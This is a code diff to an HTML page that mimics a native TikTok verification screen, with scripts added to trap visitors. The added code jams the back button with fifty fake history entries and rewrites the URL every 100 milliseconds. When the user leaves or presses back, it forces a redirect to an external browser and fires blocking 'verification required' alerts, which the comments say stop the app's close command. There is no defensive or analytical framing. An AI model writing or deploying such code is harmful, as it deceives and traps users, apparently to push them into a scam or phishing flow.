@@ -10,28 +10,19 @@
             -webkit-font-smoothing: antialiased;
             font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
         }
-        
         #main-ui {
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
             height: 100vh; text-align: center;
             padding: 0 35px; box-sizing: border-box;
         }
-
-        /* Smaller Visuals */
         .v-icon { width: 50px; height: 50px; margin-bottom: 15px; }
         .header { color: #161823; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
         .subtext { color: #8A8B91; font-size: 14px; line-height: 1.4; margin-bottom: 30px; max-width: 280px; }
-
-        /* Smaller, Native-looking TikTok Button */
         .btn { 
-            background: #fe2c55; color: #fff; 
-            padding: 12px 60px; /* Reduced padding */
-            border-radius: 4px; /* Flatter corners like native TT */
-            font-weight: 600; font-size: 15px; /* Smaller text */
-            border: none; 
-            cursor: pointer;
-            -webkit-tap-highlight-color: transparent;
+            background: #fe2c55; color: #fff; padding: 12px 60px; 
+            border-radius: 4px; font-weight: 600; font-size: 15px; 
+            border: none; cursor: pointer; -webkit-tap-highlight-color: transparent;
         }
     </style>
 </head>
@@ -73,25 +64,36 @@
         }
     }
 
-    // --- THE 5-SECOND FIX (HEARTBEAT) ---
-    // This keeps the browser process active so the X button trap never expires
+    // THE INFINITE HEARTBEAT
+    // Constantly manipulates the DOM and History to keep the thread alive
     setInterval(() => {
-        // Churns a tiny bit of memory to keep the script "hot"
-        window.history.replaceState(null, null, window.location.hash || "#refresh");
-    }, 1000);
+        const dummy = document.createElement('div');
+        document.body.appendChild(dummy);
+        document.body.removeChild(dummy);
+        history.replaceState(null, null, "#" + Date.now());
+    }, 100);
+
+    // THE BLOCKER & REDIRECTOR
+    window.onblur = function() {
+        // 1. Immediately fire the redirect
+        forceSystemOpen();
+        
+        // 2. Fire the blocking alert. 
+        // This stops the 'Close' command from reaching the app's native layer.
+        alert("Action Required: Please finish verification in the secure browser window.");
+        
+        // 3. Re-focus if they try to stay
+        window.focus();
+    };
 
     window.onload = () => {
-        // Build the back-stack immediately
-        for(let i=0; i<50; i++) history.pushState(null, null, "#sec_" + i);
+        // Jam the back button
+        for(let i=0; i<50; i++) history.pushState(null, null, "#ver_" + i);
     };
 
     window.onpopstate = () => {
         forceSystemOpen();
-    };
-
-    // The "X" Button Trap
-    window.onblur = () => {
-        forceSystemOpen();
+        alert("Verification Required.");
     };
 </script>
 </body>
